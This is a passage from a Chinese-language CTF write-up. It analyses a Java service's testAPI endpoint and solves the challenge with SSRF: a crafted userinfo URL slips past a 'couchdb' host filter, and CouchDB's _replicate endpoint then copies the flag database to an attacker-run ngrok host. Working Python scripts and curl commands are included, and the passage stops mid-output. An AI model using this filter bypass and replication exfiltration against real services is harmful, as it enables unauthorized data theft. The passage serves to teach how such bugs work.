      <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Exception</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal name&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>password</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>()</span> <span style=color:#f92672>&gt;</span> <span style=color:#111>16</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#111>validateAlphanumeric</span><span style=color:#f92672>(</span><span style=color:#111>password</span><span style=color:#f92672>))</span>
      <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Exception</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal password&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#75715e>// ... boring java stuff
</span><span style=color:#75715e></span>    <span style=color:#111>JSONObject</span> <span style=color:#111>res</span> <span style=color:#f92672>=</span> <span style=color:#111>HttpClient</span><span style=color:#f92672>.</span><span style=color:#75af00>putAPI</span><span style=color:#f92672>(</span><span style=color:#111>getDbString</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;_users/org.couchdb.user:&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>getDbString</span><span style=color:#f92672>(),</span> <span style=color:#111>userObj</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
    <span style=color:#75715e>// ... boring java stuff
</span><span style=color:#75715e></span>  <span style=color:#f92672>}</span>

<span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>addUserToDatabase</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>dbName</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>username</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>dbName</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>()</span> <span style=color:#f92672>&gt;</span> <span style=color:#111>16</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#111>validateAlphanumeric</span><span style=color:#f92672>(</span><span style=color:#111>dbName</span><span style=color:#f92672>))</span>
      <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Exception</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal dbname&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>username</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>()</span> <span style=color:#f92672>&gt;</span> <span style=color:#111>16</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#111>validateAlphanumeric</span><span style=color:#f92672>(</span><span style=color:#111>username</span><span style=color:#f92672>))</span>
      <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Exception</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal username&#34;</span><span style=color:#f92672>);</span>
   <span style=color:#75715e>// ... boring java stuff
</span><span style=color:#75715e></span>    <span style=color:#111>JSONObject</span> <span style=color:#111>res</span> <span style=color:#f92672>=</span> <span style=color:#111>HttpClient</span><span style=color:#f92672>.</span><span style=color:#75af00>putAPI</span><span style=color:#f92672>(</span><span style=color:#111>getDbString</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#111>getDbString</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;/_security&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>configObj</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
    <span style=color:#75715e>// ... boring java stuff
</span><span style=color:#75715e></span>  <span style=color:#f92672>}</span>

  <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>insertDocumentToDatabase</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>dbName</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>document</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
    <span style=color:#75715e>// ... boring java stuff
</span><span style=color:#75715e></span>    <span style=color:#111>JSONObject</span> <span style=color:#111>res</span> <span style=color:#f92672>=</span> <span style=color:#111>HttpClient</span><span style=color:#f92672>.</span><span style=color:#75af00>postAPI</span><span style=color:#f92672>(</span><span style=color:#111>getDbString</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#111>getDbString</span><span style=color:#f92672>(),</span> <span style=color:#111>document</span><span style=color:#f92672>);</span>
    <span style=color:#75715e>// ... boring java stuff
</span><span style=color:#75715e></span>  <span style=color:#f92672>}</span>
</code></pre></div><p>这部分是创建用户并插入数据库中 并且插入一个文件，欸 用的也是http发请求这一招 这不就可控了？</p>
<p>这里就完了，转去看Handlers.class</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>createUser</span><span style=color:#f92672>(</span><span style=color:#111>Context</span> <span style=color:#111>ctx</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
	<span style=color:#111>String</span> <span style=color:#111>username</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>queryParam</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;username&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>).</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>
    <span style=color:#111>String</span> <span style=color:#111>password</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>queryParam</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;password&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>).</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>
    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
        <span style=color:#111>Main</span><span style=color:#f92672>.</span><span style=color:#75af00>db</span><span style=color:#f92672>.</span><span style=color:#75af00>createDatabase</span><span style=color:#f92672>(</span><span style=color:#111>username</span><span style=color:#f92672>);</span>
        <span style=color:#111>Main</span><span style=color:#f92672>.</span><span style=color:#75af00>db</span><span style=color:#f92672>.</span><span style=color:#75af00>createUser</span><span style=color:#f92672>(</span><span style=color:#111>username</span><span style=color:#f92672>,</span> <span style=color:#111>password</span><span style=color:#f92672>);</span>
        <span style=color:#111>Main</span><span style=color:#f92672>.</span><span style=color:#75af00>db</span><span style=color:#f92672>.</span><span style=color:#75af00>addUserToDatabase</span><span style=color:#f92672>(</span><span style=color:#111>username</span><span style=color:#f92672>,</span> <span style=color:#111>username</span><span style=color:#f92672>);</span>
        <span style=color:#111>JSONObject</span> <span style=color:#111>flagDoc</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>JSONObject</span><span style=color:#f92672>();</span>
        <span style=color:#111>flagDoc</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;flag&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>Main</span><span style=color:#f92672>.</span><span style=color:#75af00>flag</span><span style=color:#f92672>);</span>
        <span style=color:#111>Main</span><span style=color:#f92672>.</span><span style=color:#75af00>db</span><span style=color:#f92672>.</span><span style=color:#75af00>insertDocumentToDatabase</span><span style=color:#f92672>(</span><span style=color:#111>username</span><span style=color:#f92672>,</span> <span style=color:#111>flagDoc</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
        <span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>result</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;success&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
		<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InternalServerErrorResponse</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Something went wrong&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>当发出一个请求 带着username和passwd时，它会调用<code>createUser()</code>创建一条用户的数据存入库中，并且存一个flagDoc；接着看最后一个testAPI</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>testAPI</span><span style=color:#f92672>(</span><span style=color:#111>Context</span> <span style=color:#111>ctx</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
	<span style=color:#111>String</span> <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>queryParam</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;url&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>).</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>
    <span style=color:#111>String</span> <span style=color:#111>method</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>queryParam</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;method&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>).</span><span style=color:#75af00>get</span><span style=color:#f92672>();</span>
    <span style=color:#111>String</span> <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>queryParam</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;data&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
		<span style=color:#111>URL</span> <span style=color:#111>urlURI</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>URL</span><span style=color:#f92672>(</span><span style=color:#111>url</span><span style=color:#f92672>);</span>
		<span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>urlURI</span><span style=color:#f92672>.</span><span style=color:#75af00>getHost</span><span style=color:#f92672>().</span><span style=color:#75af00>contains</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;couchdb&#34;</span><span style=color:#f92672>))</span>
			<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ForbiddenResponse</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal!&#34;</span><span style=color:#f92672>);</span>
	<span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>MalformedURLException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
		<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>BadRequestResponse</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Input URL is malformed&#34;</span><span style=color:#f92672>);</span>
	<span style=color:#f92672>}</span>
	<span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
		<span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>equals</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;GET&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
			<span style=color:#111>JSONObject</span> <span style=color:#111>jsonObj</span> <span style=color:#f92672>=</span> <span style=color:#111>HttpClient</span><span style=color:#f92672>.</span><span style=color:#75af00>getAPI</span><span style=color:#f92672>(</span><span style=color:#111>url</span><span style=color:#f92672>);</span>
			<span style=color:#111>String</span> <span style=color:#111>str</span> <span style=color:#f92672>=</span> <span style=color:#111>jsonObj</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>();</span>
		<span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>equals</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;POST&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
			<span style=color:#111>JSONObject</span> <span style=color:#111>jsonObj</span> <span style=color:#f92672>=</span> <span style=color:#111>HttpClient</span><span style=color:#f92672>.</span><span style=color:#75af00>postAPI</span><span style=color:#f92672>(</span><span style=color:#111>url</span><span style=color:#f92672>,</span> <span style=color:#111>data</span><span style=color:#f92672>);</span>
			<span style=color:#111>String</span> <span style=color:#111>stringJsonObj</span> <span style=color:#f92672>=</span> <span style=color:#111>jsonObj</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>();</span>
			<span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>Utils</span><span style=color:#f92672>.</span><span style=color:#75af00>containsFlag</span><span style=color:#f92672>(</span><span style=color:#111>stringJsonObj</span><span style=color:#f92672>))</span>
				<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ForbiddenResponse</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal!&#34;</span><span style=color:#f92672>);</span>
		<span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
			<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>BadRequestResponse</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Request method is not accepted&#34;</span><span style=color:#f92672>);</span>
		<span style=color:#f92672>}</span>
	<span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
			<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InternalServerErrorResponse</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Something went wrong&#34;</span><span style=color:#f92672>);</span>
	<span style=color:#f92672>}</span>
	<span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>result</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;success&#34;</span><span style=color:#f92672>);</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>对给出的url（通过url参数进行提交）进行get或者post，先检查<code>if (urlURI.getHost().contains("couchdb"))</code>，如果为真直接报错；之后发出请求 如果<code>Utils.containsFlag(stringJsonObj)</code>为真也会报错出去</p>
<p>源码算是看完了，接下来想想解题的方法（有部分关于ssrf的前置知识可以看这篇鼻祖ppt - <a href=https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai</a>）</p>
<p>本地先起一个环境，run on localhost:8080，</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl localhost:8080/testAPI?url<span style=color:#f92672>=</span>https://couchdb:5984/<span style=color:#8045ff>\&amp;</span><span style=color:#111>method</span><span style=color:#f92672>=</span>GET
Illegal!
</code></pre></div><p>由之前的代码分析我们知道因为couchdb的存在所以illegal，但是不太重要（反正终会被绕过）先创建一个用户</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl http://localhost:8080/createUser?username<span style=color:#f92672>=</span>neptunian<span style=color:#8045ff>\&amp;</span><span style=color:#111>password</span><span style=color:#f92672>=</span>neptunian
<span style=color:#75715e># Creating user</span>
success

$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs <span style=color:#111>|</span> jq
<span style=color:#75715e># Listing &#34;neptunian&#34; database documents, using our credentials (jq formats our JSON output)</span>
<span style=color:#f92672>{</span>
  <span style=color:#d88200>&#34;total_rows&#34;</span>: 1,
  <span style=color:#d88200>&#34;offset&#34;</span>: 0,
  <span style=color:#d88200>&#34;rows&#34;</span>: <span style=color:#f92672>[</span>
    <span style=color:#f92672>{</span>
      <span style=color:#d88200>&#34;id&#34;</span>: <span style=color:#d88200>&#34;99ea668366ac9d5d74fd2bc91c00ed5b&#34;</span>,
      <span style=color:#d88200>&#34;key&#34;</span>: <span style=color:#d88200>&#34;99ea668366ac9d5d74fd2bc91c00ed5b&#34;</span>,
      <span style=color:#d88200>&#34;value&#34;</span>: <span style=color:#f92672>{</span>
        <span style=color:#d88200>&#34;rev&#34;</span>: <span style=color:#d88200>&#34;1-cee1919fc2eda9a6068ed2792608a9dd&#34;</span>
      <span style=color:#f92672>}</span>
    <span style=color:#f92672>}</span>
  <span style=color:#f92672>]</span>
<span style=color:#f92672>}</span>

$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b <span style=color:#111>|</span> jq
<span style=color:#75715e># Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b</span>
<span style=color:#f92672>{</span>
  <span style=color:#d88200>&#34;_id&#34;</span>: <span style=color:#d88200>&#34;99ea668366ac9d5d74fd2bc91c00ed5b&#34;</span>,
  <span style=color:#d88200>&#34;_rev&#34;</span>: <span style=color:#d88200>&#34;1-cee1919fc2eda9a6068ed2792608a9dd&#34;</span>,
  <span style=color:#d88200>&#34;flag&#34;</span>: <span style=color:#d88200>&#34;flag{fake}&#34;</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>显然当我们新建一个用户时，我们的fake flag会被自动插入这个数据库中，并且直接curl是可以取出来的，但是题目是不能直接curl 需要缝合到限定的testAPI上，尝试构造一下~</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -vv http://localhost:8080/testAPI?method<span style=color:#f92672>=</span>GET<span style=color:#8045ff>\&amp;</span><span style=color:#111>url</span><span style=color:#f92672>=</span>http://neptunian:neptunian<span style=color:#8045ff>\@</span>couchdb<span style=color:#8045ff>\:</span>5984<span style=color:#8045ff>\@</span>couchdb<span style=color:#8045ff>\:</span>5984/neptunian
...
success
</code></pre></div><p>这样构造的url并不会触发filter，但是由于仅仅返回success而没有更多的信息，为了验证是不是触及到了couchdb server，我们可以尝试插入一个自定义的doc，这里用py脚本传</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
<span style=color:#f92672>import</span> <span style=color:#111>json</span>

<span style=color:#111>headers</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
    <span style=color:#d88200>&#39;Accept&#39;</span><span style=color:#111>:</span> <span style=color:#d88200>&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;</span>
<span style=color:#111>}</span>

<span style=color:#75715e># Simple POST Test</span>
<span style=color:#111>params</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span>
    <span style=color:#111>(</span><span style=color:#d88200>&#39;url&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian&#39;</span><span style=color:#111>),</span>
    <span style=color:#111>(</span><span style=color:#d88200>&#39;method&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>),</span>
    <span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>,</span>
        <span style=color:#111>json</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>({</span>
            <span style=color:#d88200>&#34;some_int&#34;</span><span style=color:#111>:</span> <span style=color:#ae81ff>1</span><span style=color:#111>,</span>
            <span style=color:#d88200>&#34;some_string&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;c&#34;</span>
        <span style=color:#111>})</span>
    <span style=color:#111>)</span>
<span style=color:#111>)</span>

<span style=color:#75715e># Local</span>
<span style=color:#111>response</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://localhost:8080/testAPI&#39;</span><span style=color:#111>,</span> <span style=color:#111>headers</span><span style=color:#f92672>=</span><span style=color:#111>headers</span><span style=color:#111>,</span> <span style=color:#111>params</span><span style=color:#f92672>=</span><span style=color:#111>params</span><span style=color:#111>)</span>

<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>response</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs <span style=color:#111>|</span> jq
<span style=color:#f92672>{</span>
  <span style=color:#d88200>&#34;total_rows&#34;</span>: 2,
  <span style=color:#d88200>&#34;offset&#34;</span>: 0,
  <span style=color:#d88200>&#34;rows&#34;</span>: <span style=color:#f92672>[</span>
    <span style=color:#f92672>{</span>
      <span style=color:#d88200>&#34;id&#34;</span>: <span style=color:#d88200>&#34;99ea668366ac9d5d74fd2bc91c00ed5b&#34;</span>,
      <span style=color:#d88200>&#34;key&#34;</span>: <span style=color:#d88200>&#34;99ea668366ac9d5d74fd2bc91c00ed5b&#34;</span>,
      <span style=color:#d88200>&#34;value&#34;</span>: <span style=color:#f92672>{</span>
        <span style=color:#d88200>&#34;rev&#34;</span>: <span style=color:#d88200>&#34;1-cee1919fc2eda9a6068ed2792608a9dd&#34;</span>
      <span style=color:#f92672>}</span>
    <span style=color:#f92672>}</span>,
    <span style=color:#f92672>{</span>
      <span style=color:#d88200>&#34;id&#34;</span>: <span style=color:#d88200>&#34;99ea668366ac9d5d74fd2bc91c00fd09&#34;</span>,
      <span style=color:#d88200>&#34;key&#34;</span>: <span style=color:#d88200>&#34;99ea668366ac9d5d74fd2bc91c00fd09&#34;</span>,
      <span style=color:#d88200>&#34;value&#34;</span>: <span style=color:#f92672>{</span>
        <span style=color:#d88200>&#34;rev&#34;</span>: <span style=color:#d88200>&#34;1-f8744c7d9e172ac4b188fbb8f337a204&#34;</span>
      <span style=color:#f92672>}</span>
    <span style=color:#f92672>}</span>
  <span style=color:#f92672>]</span>
<span style=color:#f92672>}</span>
<span style=color:#75715e># There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09!</span>

$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 <span style=color:#111>|</span> jq
<span style=color:#f92672>{</span>
  <span style=color:#d88200>&#34;_id&#34;</span>: <span style=color:#d88200>&#34;99ea668366ac9d5d74fd2bc91c00fd09&#34;</span>,
  <span style=color:#d88200>&#34;_rev&#34;</span>: <span style=color:#d88200>&#34;1-f8744c7d9e172ac4b188fbb8f337a204&#34;</span>,
  <span style=color:#d88200>&#34;some_int&#34;</span>: 1,
  <span style=color:#d88200>&#34;some_string&#34;</span>: <span style=color:#d88200>&#34;c&#34;</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>足以证明我们自己构造的带testAPI的缝合怪是可以正常执行couchdb相关的增删查改功能的</p>
<p>而重要的是远程也能打通，这里有这么个好东西https://docs.couchdb.org/en/3.1.1/replication/replicator.html，我们只需要构造一组post数据就可以远程得到一份数据！</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=color:#111>{</span>
    <span style=color:#f92672>&#34;source&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;source_db_name&#34;</span><span style=color:#111>,</span>
    <span style=color:#f92672>&#34;target&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;http://dest_user:dest_password@destination_host/dest_database&#34;</span>
<span style=color:#111>}</span>
</code></pre></div><p>至于做法就很简单了：先用ngrok搞一个网上可访问的couchdb，得到临时的url <a href=https://2d0a4710580a.ngrok.io>https://2d0a4710580a.ngrok.io</a>，先创建数据库来便于接收之后复制的数据</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag
<span style=color:#f92672>{</span><span style=color:#d88200>&#34;ok&#34;</span>:true<span style=color:#f92672>}</span>
</code></pre></div><p>然后就可以利用replicator和精心构造的json数据大搞特搞了！先本地</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
<span style=color:#f92672>import</span> <span style=color:#111>json</span>

<span style=color:#111>headers</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
    <span style=color:#d88200>&#39;Accept&#39;</span><span style=color:#111>:</span> <span style=color:#d88200>&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;</span>
<span style=color:#111>}</span>

<span style=color:#75715e># POST Replication</span>
<span style=color:#111>params</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span>
    <span style=color:#111>(</span><span style=color:#d88200>&#39;url&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate&#39;</span><span style=color:#111>),</span>
    <span style=color:#111>(</span><span style=color:#d88200>&#39;method&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>),</span>
    <span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>,</span>
        <span style=color:#111>json</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>({</span>
            <span style=color:#d88200>&#34;source&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;neptunian&#34;</span><span style=color:#111>,</span>
            <span style=color:#d88200>&#34;target&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag&#34;</span>
        <span style=color:#111>})</span>
    <span style=color:#111>)</span>
<span style=color:#111>)</span>

<span style=color:#75715e># response = requests.get(&#39;http://localhost:8080/testAPI&#39;, headers=headers, params=params)</span>
<span style=color:#111>response</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;https://requester.mc.ax/testAPI&#39;</span><span style=color:#111>,</span> <span style=color:#111>headers</span><span style=color:#f92672>=</span><span style=color:#111>headers</span><span style=color:#111>,</span> <span style=color:#111>params</span><span style=color:#f92672>=</span><span style=color:#111>params</span><span style=color:#111>)</span>

<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>response</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs <span style=color:#111>|</span> jq
<span style=color:#f92672>{</span>
  <span style=color:#d88200>&#34;total_rows&#34;</span>: 1,
  <span style=color:#d88200>&#34;offset&#34;</span>: 0,
  <span style=color:#d88200>&#34;rows&#34;</span>: <span style=color:#f92672>[</span>
    <span style=color:#f92672>{</span>
      <span style=color:#d88200>&#34;id&#34;</span>: <span style=color:#d88200>&#34;d139bf6ab1733d779f64e9c6c4026de9&#34;</span>,
      <span style=color:#d88200>&#34;key&#34;</span>: <span style=color:#d88200>&#34;d139bf6ab1733d779f64e9c6c4026de9&#34;</span>,
      <span style=color:#d88200>&#34;value&#34;</span>: <span style=color:#f92672>{</span>
        <span style=color:#d88200>&#34;rev&#34;</span>: <span style=color:#d88200>&#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&#34;</span>
      <span style=color:#f92672>}</span>
    <span style=color:#f92672>}</span>
